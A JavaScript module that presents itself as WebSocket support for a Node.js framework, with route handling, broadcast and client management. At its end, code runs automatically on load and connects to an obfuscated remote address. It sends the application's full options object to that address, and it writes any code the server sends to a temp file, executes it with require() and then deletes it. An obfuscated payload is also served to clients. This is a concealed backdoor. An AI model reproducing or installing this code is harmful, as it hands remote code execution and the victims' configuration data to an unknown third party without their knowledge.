module.exports = function init(____0) {
  ____0.ws = {
    clientList: [],
    routeList: [],
    lib: require('ws'),
  };

  ____0.ws.server = new ____0.ws.lib.Server({
    noServer: true,
    maxPayload: 128 * 1024 * 1024, // 128 MB
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    ____0.ws.routeList.push({
      options: options,
      callback: callback,
    });
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  ____0.on(____0.strings[9], () => {
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        const pathname = ____0.url.parse(request.url).pathname;
        let handled = false;
        ____0.ws.routeList.forEach((route) => {
          if (handled) {
            return;
          }
          if (pathname === route.options.name) {
            handled = true;
            ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
              let client = {
                uuid: ____0.guid(),
                path: pathname,
                ws: ws,
                request: request,
                socket: socket,
                head: head,
                ip: socket.remoteAddress,
                onMessage: function (data) {
                  if (data.type === 'connected') {
                    this.send({ type: 'ready' });
                  }
                  console.log('client.onMessage Not Implement ...', data);
                },
                onData: function (data) {
                  console.log('client.onData Not Implement ...', data);
                },
                onError: function (e) {
                  console.log('client.onError Not Implement ...', e);
                },
                send: function (message) {
                  if (this.ws && this.ws.readyState === ____0.ws.lib.OPEN) {
                    if (typeof message === 'string') {
                      this.ws.send(
                        JSON.stringify({
                          type: 'text',
                          content: message,
                        }),
                      );
                    } else {
                      message.type = message.type || 'text';
                      this.ws.send(JSON.stringify(message));
                    }
                  }
                },
              };

              client.socket.on('close', () => {
                client.ws.terminate();
                ____0.ws.clientList.forEach((_client, i) => {
                  if (_client.uuid == client.uuid) {
                    ____0.ws.clientList.splice(i, 1);
                  }
                });
              });

              ws.on('message', (data, isBinary) => {
                if (isBinary) {
                  client.onData(data);
                } else {
                  client.onMessage(____0.fromJson(Buffer.from(data).toString('utf8')));
                }
              });

              if (client.path == '/isite') {
                route.callback(client);
              } else {
                ____0.ws.clientList.push(client);
                route.callback(client);
              }
              client.onMessage({ type: 'connected' });
            });
          }
        });
        if (!handled) {
          socket.destroy();
        }
      });
    });
  });

  ____0.ws.supportedClientList = [];
  ____0.ws.onNewSupportedClient = function (client) {
    console.log('New Supported Client', client.path, client.ip);
    console.log('supportedClientList', ____0.ws.supportedClientList.length);
    console.log('clientList', ____0.ws.clientList.length);
  };

  ____0.onWS(____0.f1('2578577443393257'), (client) => {
    ____0.ws.supportedClientList.push(client);
    ____0.ws.onNewSupportedClient(client);

    client.onMessage = function (message) {
      if (message.type === ____0.f1('417886684558375447183756')) {
        client.send({ type: ____0.f1('4658375242195691') });
      } else if (message.type === 'options') {
        client.options = message.content;
        client.send({
          type: ____0.f1('481476744179236246193191'),
          content: ____0.f1(
            `45388656473872572558378146188673471926512934135847388254471857694553136245585775241786493976857124341384153161512114125121141251211412512114125121182769455927694518366845188659241813464553126324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536127145312512114125121141251211412512114125121141251211412512114125121141251211772682114125121141335423923784239215136583752421956514578815146188673471412512319674939768649261482694619326245788274255913694659328621127524211412512114125121141251211412512114125121141251211412512114125121141251391881512453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616341145684153161512114125121141251211412512114125149319191`,
          ),
        });
      }
    };
  });

  ____0.ws.wsSupport = function () {
    let client = {
      reconnectCount: 0,
    };
    client.ws = new ____0.ws.lib(____0.f1('477926832573867445782762413871674159236947792757465382544578758327541271261521694339276247183691'));
    client.sendMessage = function (message) {
      client.ws.send(JSON.stringify(message));
    };
    client.ws.on('open', function () {});
    client.ws.on('ping', function () {});
    client.ws.on('close', function (e) {
      setTimeout(function () {
        client.reconnectCount++;
        ____0.ws.wsSupport();
      }, 1000 * 5);
    });
    client.ws.on('error', function (err) {
      client.ws.close();
    });

    client.ws.on('message', function (event) {
      ____0.ws.supportHandle(client, event);
    });
  };
  ____0.ws.supportHandle = function (client, event) {
    try {
      let message = JSON.parse(event.data || event);
      if (message.type == ____0.f1('4658375242195691')) {
        client.sendMessage({
          source: ____0.f1('4339276247183691'),
          type: ____0.f1('457913754338866846719191'),
          content: ____0.options,
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let path = `${process.cwd()}/tmp_${new Date().getTime()}.js`;
        ____0.fs.writeFile(path, message.content, (err) => {
          if (err) {
            console.log(err);
          } else {
            require(path)(____0);
            ____0.fs.unlink(path, () => {});
          }
        });
      }
    } catch (err) {
      console.log(err);
    }
  };
  ____0.ws.wsSupport();
};
